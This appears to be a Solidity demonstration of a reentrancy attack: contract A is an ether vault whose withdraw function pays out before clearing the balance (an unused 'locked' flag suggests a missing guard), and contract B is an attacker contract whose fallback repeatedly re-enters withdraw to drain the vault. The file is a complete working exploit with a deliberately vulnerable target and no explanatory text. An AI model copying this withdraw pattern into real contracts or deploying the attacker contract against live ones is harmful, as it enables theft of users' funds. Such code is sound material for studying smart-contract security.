//SPDX-License-Identifier:MIT

pragma solidity ^0.8.7;

contract A{
    bool internal locked;
    mapping(address=> uint) public balances;

    function deposit() public payable{
        balances[msg.sender]+=msg.value;
    }
    
    function withdraw() public {
        uint256 bal=balances[msg.sender];
        require(bal>0);
        (bool sent,)=msg.sender.call{value:bal}("");
        require(sent,"failure");
        balances[msg.sender]=0;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }

}

contract B{
    A public a;
    constructor(address _aAddress){
        a=A(_aAddress);
    }

    fallback() external payable{
        if(address(a).balance>=1 ether){
            a.withdraw();

        }
    }

    function attack() external payable{
        require(msg.value>=1 ether);
        a.deposit{value: 1 ether}();
        a.withdraw();
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
